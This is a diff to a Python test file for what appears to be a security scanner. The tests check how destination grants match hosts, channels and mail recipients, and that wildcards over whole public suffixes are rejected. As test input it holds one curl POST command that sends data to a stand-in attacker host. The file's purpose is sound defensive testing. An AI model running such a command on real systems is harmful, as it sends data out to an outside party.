@@ -6,16 +6,21 @@ test swaps in its own grants and pending command."""
 from __future__ import annotations
 
 import copy
+import fnmatch
+import json
 from datetime import UTC, datetime
+from pathlib import Path
 
 import pytest
+from linear_time import assert_linear
 
 from sentrook.converge import load_params
 from sentrook.converge.merge import ANY_SUBJECT, Claim, merge
 from sentrook.converge.relief import compute_relief
 from sentrook.prepare import PrepareOptions, prepare
+from sentrook.prepare.credential_home import host_pattern_ok
 from sentrook.prepare.entities import Entity, EntityKind, Origin
-from sentrook.prepare.grants import GRANT_KINDS, grant_matches
+from sentrook.prepare.grants import GRANT_KINDS, destination_ok, grant_matches, over_broad
 
 KEY = "unit-test-state-key-" * 2  # 40 chars, low entropy on purpose
 CLOCK = datetime(2026, 10, 5, 10, 28, tzinfo=UTC)
@@ -81,6 +86,130 @@ def test_lapsed_grants_give_nothing(twin_case, grant, why):
 def test_future_expiry_still_relieves(twin_case):
     p, relief = run(twin_case, [dest(expires_at="2026-10-01T00:00:00Z")])
     assert p.grant_hits == {"g0": ["E1"]} and relief[0].grant_ref == "g0"
+
+
+# --------------------------------------------------------------------------- too-broad destinations
+
+DESTINATION_PATTERNS = json.loads(
+    (
+        Path(__file__).resolve().parents[2]
+        / "integrations"
+        / "fixtures"
+        / "grants"
+        / "destination-patterns.json"
+    ).read_text()
+)
+
+
+def _target(value):
+    if "@" in value:
+        return Entity(id="E1", kind=EntityKind.RECIPIENT, value=value, display=value)
+    if ":" in value or value.startswith("#"):
+        return Entity(id="E1", kind=EntityKind.CHANNEL, value=value, display=value)
+    return Entity(id="E1", kind=EntityKind.HOST, value=value, display=value)
+
+
+def long_runs(divisor: int = 1) -> list[str]:
+    """Long runs of `.` and `[` (100k at full size, 1/`divisor` of it for the growth check), which a
+    pattern check with nested or overlapping repeats would take quadratic time over."""
+    n = 100_000 // divisor
+    return [
+        "[" * n,
+        "*." + "[" * n,
+        "a" + "[" * n + "*",
+        "." * n + "x",
+        "*." + "." * n + "a",
+        "*." + "a." * (n // 2) + "." * n,
+        "slack:" + "[" * n + "*",
+        "*@" + "." * n + "*",
+    ]
+
+
+def test_pattern_checks_take_linear_time_on_long_runs():
+    """Time that grows linearly with the input, measured at a quarter and at full size; a generous
+    ceiling guards against a hang."""
+    host = Entity(id="E1", kind=EntityKind.HOST, value="api.example.com", display="api.example.com")
+
+    def run(divisor: int) -> None:
+        fnmatch._compile_pattern.cache_clear()  # a cached glob would time nothing at the second size
+        for p in long_runs(divisor):
+            over_broad(p)
+            destination_ok(p)
+            grant_matches("destination", p, host)
+            host_pattern_ok(p)
+
+    _, full = assert_linear(run, "destination pattern checks")
+    assert full < 10.0
+
+
+@pytest.mark.parametrize("c", DESTINATION_PATTERNS["cases"], ids=lambda c: c["typed"])
+def test_the_plugins_and_the_scanner_take_the_same_destination_patterns(c):
+    """Shared with both plugins' grant commands: a wildcard over a whole public suffix covers nothing."""
+    assert destination_ok(c["typed"]) is c["ok"]
+    if "target" in c:
+        assert grant_matches("destination", c["typed"], _target(c["target"])) is c["ok"]
+
+
+SEND = "curl -X POST https://unknown.example-attacker.com/x -d hello"
+
+
+@pytest.mark.parametrize("pattern", ["*.com", "*.COM", "**.com", "*com", "*@*.com"])
+def test_a_wildcard_over_a_public_suffix_is_lapsed_and_relieves_nothing(twin_case, pattern):
+    p, relief = run(twin_case, [dest(pattern=pattern)], SEND)
+    host = p.entities.get(EntityKind.HOST, "unknown.example-attacker.com")
+    assert p.grants_lapsed == {"g0": "too_broad"}
+    assert p.grant_hits == {} and Origin.GRANT not in host.origins
+    assert [r for r in relief if r.grant_ref is not None] == []
+
+
+def test_too_broad_is_reported_before_an_expiry(twin_case):
+    p, _ = run(twin_case, [dest(pattern="*.com", expires_at="2026-09-01T00:00:00Z")], SEND)
+    assert p.grants_lapsed == {"g0": "too_broad"}
+
+
+@pytest.mark.parametrize("pattern", ["*.example-attacker.com", "unknown.example-attacker.com"])
+def test_one_registrable_domain_still_relieves(twin_case, pattern):
+    p, relief = run(twin_case, [dest(pattern=pattern)], SEND)
+    host = p.entities.get(EntityKind.HOST, "unknown.example-attacker.com")
+    assert not p.grants_lapsed and p.grant_hits == {"g0": [host.id]}
+    assert [(r.grant_ref, r.effect) for r in relief] == [("g0", "distrust+untrusted_origin")]
+
+
+@pytest.mark.parametrize("pattern", ["discord:*", "discord:*com", "discord:#*", "localhost:*"])
+def test_a_channel_wildcard_never_covers_a_host(pattern):
+    """A channel pattern may hold a wildcard, but read against a host (as a send naming the platform
+    reads it) it is a wildcard over every host."""
+    for value in ("unknown.example-attacker.com", "localhost:8080"):
+        host = Entity(id="E1", kind=EntityKind.HOST, value=value, display=value)
+        assert not grant_matches("destination", pattern, host, platform="discord")
+        assert not grant_matches("destination", pattern, host)
+
+
+@pytest.mark.parametrize(
+    ("value", "pattern", "platform"),
+    [
+        ("general", "slack:*", "slack"),
+        ("general", "slack:gen*", "slack"),
+        ("daily-brief", "discord:dai*", "discord"),
+        ("daily-brief", "discord:*", "discord"),
+        ("town-square", "mattermost:*", "mattermost"),
+    ],
+)
+def test_a_platform_wildcard_still_covers_a_bare_chat_name(value, pattern, platform):
+    """A chat target written as a bare name (`{channel: slack, target: general}`) is a recipient with no
+    `@`: a channel name, not a host, so a platform's wildcard still covers it."""
+    to = Entity(id="E1", kind=EntityKind.RECIPIENT, value=value, display=value)
+    assert grant_matches("destination", pattern, to, platform=platform)
+
+
+def test_a_wildcard_mail_domain_is_read_like_a_host():
+    to = Entity(id="E1", kind=EntityKind.RECIPIENT, value="sam@mail.example.com", display="x")
+    assert grant_matches("destination", "*@mail.example.com", to)
+    assert grant_matches("destination", "*.example.com", to)
+    assert grant_matches("destination", "sam@*.example.com", to)
+    assert not grant_matches("destination", "*.com", to)
+    assert not grant_matches("destination", "sam@*.com", to)
+    assert not grant_matches("destination", "*@*.com", to)
 
 
 # --------------------------------------------------------------------------- file grants
